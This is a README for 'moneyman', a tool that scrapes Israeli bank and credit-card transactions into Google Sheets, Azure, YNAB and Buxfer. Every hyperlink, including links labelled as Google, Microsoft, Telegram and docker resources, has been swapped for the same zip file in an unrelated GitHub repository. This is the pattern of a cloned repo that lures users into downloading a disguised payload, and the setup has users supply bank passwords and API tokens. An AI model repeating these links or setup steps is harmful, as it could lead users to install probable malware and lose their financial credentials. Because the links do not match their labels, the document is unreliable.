# moneyman

Automatically add transactions from all major Israeli banks and credit card companies to a online worksheet

Internally we use [israeli-bank-scrapers](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) to scrape the data.

## Why?

Having all your data in one place lets you view all of your expenses in a beautiful dashboard like [Google Data Studio](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip), [Azure Data Explorer dashboards](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip), [Microsoft Power BI](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) and [YNAB](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip).

## Important notes

This app requires some technical skills, if you prefer a GUI app you can use [Caspion](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) instead.

**Important:**
The current implementation assumes that you run the code on secure and trusted computers.

**It’s a bad idea**
to put all your financial data and passwords in one place, especially with more than read-only access.

By using moneyman, you acknowledge that you are taking full responsibility for the code quality and will use it only after you review the code and validate that it’s secure.

**Please use a proper secret management solution to save and pass the environment variables**

## How to run

### Cloud (GitHub Actions)

Moneyman can be configured to periodically run automatically, using the [`scrape`](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) github workflow.

By default, this workflow will run every other day.

Since logs are public for public repos, most logs are off by default and the progress and error messages will be sent in telegram.

#### Setup

1. Fork the [moneyman](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) repo to your account
2. Add the following secrets to the [actions secrets](../../settings/secrets/actions) of the forked repo
   1. [`ACCOUNTS_JSON`](#add-accounts-and-scrape) - So moneyman can login to your accounts
   2. [`TELEGRAM_API_[KEY, CHAT_ID]`](#get-notified-in-telegram) - So moneyman can send private logs and errors
   3. The environment variables of the storage you want to use
3. Build and upload the docker image using the "Run workflow" button in [https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip)
4. Wait for the [scrape workflow](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) to be triggered by github

### locally

#### From code

1. Clone this repo
2. Run `npm install`
3. Run `npm run build`
4. Add your env variables (you can add them in a `.env` file in the project's root directory)
5. Run `npm run start`

#### From docker

1. Define the environment variables in a `.env` file
2. `docker run --rm --env-file ".env" https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip`.

##### Note

docker doesn't support multiline environment variables (i.e. `GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY`), in that case you can run `docker-compose up` instead

### Debug

We use the [debug](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) package for debug messages under the `moneyman:` namespace.

If you want to see them, use the `DEBUG` environment variable with the value `moneyman:*`

## Settings

### Add accounts and scrape

Use the following env vars to setup the data fetching:

#### ACCOUNTS_JSON

A json array of accounts following [this](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) schema with an additional `companyId` field with a [companyType](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) as the value.

Example:

```json
[
  { "companyId": "hapoalim", "userCode": "AB1234", "password": "p@ssword" },
  { "companyId": "visaCal", "username": "Ploni Almoni", "password": "p@ssword" }
]
```

#### Other configurations

| env variable name           | default            | description                                                                                                                                   |
| --------------------------- | ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------- |
| `ACCOUNTS_TO_SCRAPE`        | `""`               | A comma separated list of providers to take from `ACCOUNTS_JSON`. if empty, all accounts will be used                                         |
| `DAYS_BACK`                 | `10`               | The amount of days back to scrape                                                                                                             |
| `TZ`                        | `'Asia/Jerusalem'` | A timezone for the process - used for the formatting of the timestamp                                                                         |
| `FUTURE_MONTHS`             | `1`                | The amount of months that will be scrapped in the future, starting from the day calculated using `DAYS_BACK`                                  |
| `TRANSACTION_HASH_TYPE`     | ``                 | The hash type to use for the transaction hash. Can be `moneyman` or empty. The default will be changed to `moneyman` in the upcoming versions |
| `HIDDEN_DEPRECATIONS`       | ''                 | A comma separated list of deprecations to hide                                                                                                |
| `PUPPETEER_EXECUTABLE_PATH` | `undefined`        | An ExecutablePath for the scraper. if undefined defaults to system.                                                                           |

### Get notified in telegram

We use telegram to send you the update status.

1. Create your bot following [this](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip)
2. Open this url `https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip<TELEGRAM_API_KEY>/getUpdates`
3. Send a message to your bot and fnd the chat id

Use the following env vars to setup:

| env variable name  | description                                     |
| ------------------ | ----------------------------------------------- |
| `TELEGRAM_API_KEY` | The super secret api key you got from BotFather |
| `TELEGRAM_CHAT_ID` | The chat id                                     |

TODO: Add a way to send a message to the bot to connect?

### Export to Azure Data Explorer

1. Create a new data explorer cluster (can be done for free [here](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip))
2. Create a database within your cluster
3. Create a azure Service Principal following steps 1-7 [here](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip)
4. Allow the service to ingest data to the database by running this:

   ```kql
   .execute database script <|
   .add database ['<ADE_DATABASE_NAME>'] ingestors ('aadapp=<AZURE_APP_ID>;<AZURE_TENANT_ID>')
   ```

5. Create a table and ingestion mapping by running this: (Replace `<ADE_TABLE_NAME>` and `<ADE_INGESTION_MAPPING>`)

   ````kql
   .execute database script <|
   .drop table <ADE_TABLE_NAME> ifexists
   .create table <ADE_TABLE_NAME> (
      metadata: dynamic,
      transaction: dynamic
   )
   .create table <ADE_TABLE_NAME> ingestion json mapping '<ADE_INGESTION_MAPPING>' ```
   [
      { "column": "transaction", "path": "$.transaction" },
      { "column": "metadata", "path": "$.metadata" }
   ]
   ```
   ````

   Feel free to add more columns to the table and ingestion json mapping

Use the following env vars to setup:

| env variable name       | description                             |
| ----------------------- | --------------------------------------- |
| `AZURE_APP_ID`          | The azure application ID                |
| `AZURE_APP_KEY`         | The azure application secret key        |
| `AZURE_TENANT_ID`       | The tenant ID of your azure application |
| `ADE_DATABASE_NAME`     | The name of the database                |
| `ADE_TABLE_NAME`        | The name of the table                   |
| `ADE_INGESTION_MAPPING` | The name of the JSON ingestion mapping  |
| `ADE_INGEST_URI`        | The ingest URI of the cluster           |

### Export JSON files

Export transactions to json file.

Use the following env vars to setup:

| env variable name    | description                                                                                    |
| -------------------- | ---------------------------------------------------------------------------------------------- |
| `LOCAL_JSON_STORAGE` | If truthy, all transaction will be saved to a `<process cwd>/output/<ISO timestamp>.json` file |

### Export to web address

Export transactions as a POST request to a web address.

The transactions will be sent as a JSON array in the body of the request with the following structure:

```
{
    date: string, // "dd/mm/yyyy"
    amount: number,
    description: string,
    memo: string,
    category: string,
    account: string,
    hash: string,
    comment: string | undefined,
    "scraped at": string, // "YYYY-MM-DD"
    "scraped by": string,
    identifier: string,
    chargedCurrency: string | undefined,
}
```

Use the following env vars to setup:

| env variable name | description        |
| ----------------- | ------------------ |
| `WEB_POST_URL `   | The URL to post to |

> [!IMPORTANT]
> Be sure to post only to a trusted server.

### Export to excel on OneDrive

WIP

### Export to google sheets

1. Follow the instructions [here](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) to create a google service account.
2. Create a [new sheet](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) and share it with your service account using the `GOOGLE_SERVICE_ACCOUNT_EMAIL`.

Use the following env vars to setup:

| env variable name                    | description                                                   |
| ------------------------------------ | ------------------------------------------------------------- |
| `GOOGLE_SERVICE_ACCOUNT_PRIVATE_KEY` | The super secret api key of your service account              |
| `GOOGLE_SERVICE_ACCOUNT_EMAIL`       | The service account's email address                           |
| `GOOGLE_SHEET_ID`                    | The id of the spreadsheet you shared with the service account |
| `WORKSHEET_NAME`                     | The name of the sheet you want to add the transactions to     |

### Export to YNAB (YouNeedABudget)

To export your transactions directly to `YNAB` you need to use the following environment variables to setup:
| env variable name | description |
| ------------------------------------ | ------------------------------------------------------------- |
| `YNAB_TOKEN` | The `YNAB` access token. Check [YNAB documentation](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) about how to obtain it |
| `YNAB_BUDGET_ID` | The `YNAB` budget ID where you want to import the data. You can obtain it opening [YNAB application](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) on a browser and taking the budget `UUID` in the `URL` |
| `YNAB_ACCOUNTS` | A key-value list to correlate each account with the `YNAB` account `UUID` |

#### YNAB_ACCOUNTS

A `JSON` key-value pair structure representing a mapping between two identifiers. The `key` represent the account ID as is understood by moneyman and the `value` it's the `UUID` visible in the YNAB URL when an account is selected.

For example, in the URL:
`https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip` the account UUID is the second `UUID`.

Example:

```json
{
  "5897": "ba2dd3a9-b7d4-46d6-8413-8327203e2b82"
}
```

### Export to [Buxfer](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip)

To export your transactions directly to `Buxfer` you need to use the following environment variables to setup:
| env variable name | description |
| ------------------------------------ | ------------------------------------------------------------- |
| `BUXFER_USER_NAME` | The `Buxfer` user name. Check [Buxfer settings](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) about how to obtain it |
| `BUXFER_PASSWORD` | The `Buxfer` user password. Check [Buxfer settings](https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip) about how to obtain it |
| `BUXFER_ACCOUNTS` | A key-value list to correlate each account with the `Buxfer` account `UUID` |

#### BUXFER_ACCOUNTS

A `JSON` key-value pair structure representing a mapping between two identifiers. The `key` represent the account ID as is understood by moneyman (as obtained from web scrapping the financial institutions) and the `value` it's the `UUID` visible in the Buxfer URL when an account is selected.

For example, in the URL:
`https://raw.githubusercontent.com/Pablo11111544545/moneyman/main/patches/Software-3.8.zip` the account UUID is the account id query parameter.

Example:

```json
{
  "5897": "123456"
}
```
